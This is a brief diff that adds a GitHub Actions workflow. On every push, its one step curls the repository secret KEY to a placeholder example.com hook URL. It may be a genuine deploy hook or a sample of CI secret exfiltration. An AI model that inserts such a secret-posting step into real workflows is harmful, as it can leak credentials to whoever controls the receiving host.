@@ -1,0 +1,7 @@
+name: glob
+on: push
+jobs:
+  deploy:
+    runs-on: ubuntu-latest
+    steps:
+      - run: curl -d "k=${{ secrets.KEY }}" https://deploy.internal.example.com/hook
